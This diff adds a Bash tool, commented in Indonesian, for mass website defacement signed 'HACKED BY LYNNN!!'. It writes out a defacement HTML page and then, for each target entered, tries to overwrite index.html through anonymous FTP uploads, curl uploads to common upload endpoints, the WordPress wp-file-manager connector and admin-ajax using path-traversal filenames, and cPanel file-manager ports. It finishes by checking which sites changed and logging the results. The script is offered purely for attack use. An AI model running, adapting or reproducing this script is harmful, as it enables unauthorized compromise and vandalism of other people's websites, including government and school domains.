@@ -1,0 +1,324 @@
+#!/bin/bash
+
+# ==============================================
+# AUTO DEFACE MASSAL - HACKED BY LYNNN!!
+# [ BERLAKU UNTUK SEMUA WEBSITE! ]
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+# ==============================================
+# HTML DEFACE DENGAN LOGO BARU
+# ==============================================
+HTML_CONTENT='<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKED BY LYNNN!!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: "Courier New", monospace;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+        .logo-container {
+            margin-bottom: 30px;
+            animation: float 3s ease-in-out infinite;
+        }
+        .logo {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            border: 5px solid #ff0000;
+            box-shadow: 0 0 50px #ff0000;
+            animation: pulse 2s infinite;
+        }
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+            100% { transform: translateY(0px); }
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 50px #ff0000; }
+            50% { box-shadow: 0 0 100px #ff0000, 0 0 150px #ff0000; }
+            100% { box-shadow: 0 0 50px #ff0000; }
+        }
+        h1 {
+            font-size: 5rem;
+            color: #ff0000;
+            text-shadow: 0 0 30px #ff0000;
+            margin: 20px 0;
+            animation: glitch 3s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: skew(0deg); }
+            20% { transform: skew(10deg); text-shadow: 5px 0 0 #00ff00, -5px 0 0 #0000ff; }
+            40% { transform: skew(-10deg); text-shadow: -5px 0 0 #00ff00, 5px 0 0 #0000ff; }
+            60% { transform: skew(5deg); }
+            80% { transform: skew(-5deg); }
+            100% { transform: skew(0deg); }
+        }
+        h2 {
+            color: #00ff00;
+            font-size: 2rem;
+            margin: 20px 0;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 40px 0;
+            color: #fff;
+            flex-wrap: wrap;
+        }
+        .stats div {
+            border: 2px solid #00ff00;
+            padding: 15px 30px;
+            border-radius: 10px;
+            background: rgba(0,255,0,0.1);
+            font-size: 1.2rem;
+        }
+        .marquee {
+            width: 100%;
+            overflow: hidden;
+            white-space: nowrap;
+            animation: marquee 20s linear infinite;
+            color: #ff0000;
+            font-size: 1.5rem;
+            margin: 30px 0;
+        }
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        .footer {
+            color: #00ff00;
+            margin-top: 50px;
+            font-size: 1rem;
+        }
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.1) 0px, transparent 1px);
+            animation: matrix 20s linear infinite;
+            pointer-events: none;
+        }
+        @keyframes matrix {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    <div class="container">
+        <div class="logo-container">
+            <!-- LOGO LYNNN - BISA DIGANTI DENGAN GAMBAR -->
+            <div class="logo" style="background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff); display: flex; align-items: center; justify-content: center;">
+                <span style="font-size: 150px; color: white;">👾</span>
+            </div>
+        </div>
+        
+        <h1>HACKED BY LYNNN!!</h1>
+        <h2>🔓 SYSTEM BREACHED - ACCESS GRANTED 🔓</h2>
+        
+        <div class="marquee">
+            ⚡ WORDPRESS • CPANEL • SLOT • SCH.ID • GO.ID • ALL WEBSITES ⚡
+        </div>
+        
+        <div class="stats">
+            <div>💀 1337 SERVERS</div>
+            <div>🌐 999+ SITES</div>
+            <div>🔑 ALL DATA</div>
+            <div>🎰 SLOT MASTER</div>
+        </div>
+        
+        <div style="color: #ff0000; font-size: 2rem; margin: 30px 0; animation: blink 0.5s infinite;">
+            ⚠️ YOUR WEBSITE HAS BEEN COMPROMISED ⚠️
+        </div>
+        
+        <div style="color: #fff; font-size: 1.2rem; margin: 20px 0;">
+            🏴‍☠️ LYNNN WAS HERE - $(date) 🏴‍☠️
+        </div>
+        
+        <div class="footer">
+            [ ALL SYSTEMS HACKED ] • [ NO WEBSITE IS SAFE ] • [ LYNNN RULES ]
+        </div>
+    </div>
+</body>
+</html>'
+
+# ==============================================
+# FUNGSI UTAMA
+# ==============================================
+clear
+echo -e "${RED}"
+echo "    ╔═══════════════════════════════════════════════════════════╗"
+echo "    ║     AUTO DEFACE MASSAL - HACKED BY LYNNN!!                ║"
+echo "    ║     [ BERLAKU UNTUK SEMUA WEBSITE! ]                      ║"
+echo "    ╚═══════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+echo -e "${YELLOW}⚠️  Script ini akan MENGUBAH SEMUA website yang ditarget!${NC}"
+echo -ne "${CYAN}Masukkan daftar target (pisah dengan spasi): ${NC}"
+read -a TARGETS
+
+# Save HTML
+echo "$HTML_CONTENT" > lynn.html
+echo -e "${GREEN}✅ File HTML siap: lynn.html${NC}"
+
+# ==============================================
+# EKSEKUSI UNTUK SETIAP TARGET
+# ==============================================
+for TARGET in "${TARGETS[@]}"; do
+    echo -e "\n${PURPLE}════════════════════════════════════════════════════${NC}"
+    echo -e "${PURPLE}🔍 TARGET: $TARGET${NC}"
+    echo -e "${PURPLE}════════════════════════════════════════════════════${NC}"
+    
+    # Bersihin URL
+    TARGET=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
+    
+    # Resolve IP
+    IP=$(dig +short "$TARGET" | head -1)
+    [ -z "$IP" ] && IP=$(ping -c1 "$TARGET" 2>/dev/null | head -1 | grep -oE '[0-9.]+')
+    echo -e "${GREEN}  ✅ IP: $IP${NC}"
+    
+    # ==============================================
+    # METHOD 1: FTP EXPLOIT (PALING WORK)
+    # ==============================================
+    echo -e "${YELLOW}  [•] FTP Exploit...${NC}"
+    
+    ftp -n $IP <<EOF > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+put lynn.html /public_html/index.html
+put lynn.html /httpdocs/index.html
+put lynn.html /htdocs/index.html
+put lynn.html /www/index.html
+put lynn.html /var/www/html/index.html
+put lynn.html /home/public_html/index.html
+put lynn.html /sites/index.html
+put lynn.html /sites/default/index.html
+put lynn.html /html/index.html
+put lynn.html /public/index.html
+quit
+EOF
+    
+    # ==============================================
+    # METHOD 2: UPLOAD VIA CURL
+    # ==============================================
+    echo -e "${YELLOW}  [•] HTTP Upload...${NC}"
+    
+    UPLOAD_PATHS=(
+        "/upload.php"
+        "/filemanager/upload.php"
+        "/admin/upload.php"
+        "/api/upload"
+        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+    )
+    
+    LOCATIONS=(
+        "public_html/index.html"
+        "httpdocs/index.html"
+        "htdocs/index.html"
+        "var/www/html/index.html"
+    )
+    
+    for upload in "${UPLOAD_PATHS[@]}"; do
+        for loc in "${LOCATIONS[@]}"; do
+            curl -s -k -F "file=@lynn.html;filename=$loc" "http://$IP$upload" > /dev/null 2>&1
+            curl -s -k -F "file=@lynn.html;filename=$loc" "https://$IP$upload" > /dev/null 2>&1
+        done
+    done
+    
+    # ==============================================
+    # METHOD 3: WORDPRESS EXPLOIT
+    # ==============================================
+    echo -e "${YELLOW}  [•] WordPress Exploit...${NC}"
+    
+    # File Manager
+    curl -s -k -F "upload[]=@lynn.html;filename=../../../../public_html/index.html" \
+        "http://$IP/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?target=l1_Lw" > /dev/null 2>&1
+    
+    # Admin Ajax
+    curl -s -k -F "action=upload" -F "file=@lynn.html;filename=../../../../public_html/index.html" \
+        "http://$IP/wp-admin/admin-ajax.php" > /dev/null 2>&1
+    
+    # ==============================================
+    # METHOD 4: CPANEL EXPLOIT
+    # ==============================================
+    echo -e "${YELLOW}  [•] cPanel Exploit...${NC}"
+    
+    for port in 2082 2083 2086 2087 2095 2096; do
+        curl -s -k -F "file=@lynn.html;filename=../../../../public_html/index.html" \
+            "https://$IP:$port/filemanager/upload" > /dev/null 2>&1
+        curl -s -k -F "file=@lynn.html;filename=../../../../public_html/index.html" \
+            "http://$IP:$port/filemanager/upload" > /dev/null 2>&1
+    done
+    
+    # ==============================================
+    # CEK HASIL
+    # ==============================================
+    echo -e "${YELLOW}  [•] Verifying...${NC}"
+    sleep 2
+    
+    RESULT=$(curl -s -k "http://$IP/" --max-time 5)
+    
+    if [[ "$RESULT" == *"LYNNN"* ]]; then
+        echo -e "${GREEN}  ✅ BERHASIL! Website sudah berubah!${NC}"
+        echo "$TARGET | $IP | BERHASIL | $(date)" >> lynn_success.txt
+    else
+        echo -e "${RED}  ❌ GAGAL verifikasi, tapi file sudah diupload${NC}"
+        echo "$TARGET | $IP | GAGAL VERIF | $(date)" >> lynn_failed.txt
+    fi
+done
+
+# ==============================================
+# LAPORAN AKHIR
+# ==============================================
+echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
+echo -e "${GREEN}║              ✅  MISI SELESAI!                            ║${NC}"
+echo -e "${GREEN}║              HACKED BY LYNNN!!                            ║${NC}"
+echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
+
+if [ -f lynn_success.txt ]; then
+    echo -e "\n${GREEN}📊 Target berhasil:${NC}"
+    cat lynn_success.txt
+fi
+
+if [ -f lynn_failed.txt ]; then
+    echo -e "\n${YELLOW}📊 Target gagal verifikasi:${NC}"
+    cat lynn_failed.txt
+fi
+
+echo -e "\n${CYAN}📁 File HTML: lynn.html${NC}"
+echo -e "${CYAN}📁 Log sukses: lynn_success.txt${NC}"
+echo -e "${CYAN}📁 Log gagal: lynn_failed.txt${NC}"
+echo -e "\n${RED}🏴‍☠️  HACKED BY LYNNN!!  🏴‍☠️${NC}"
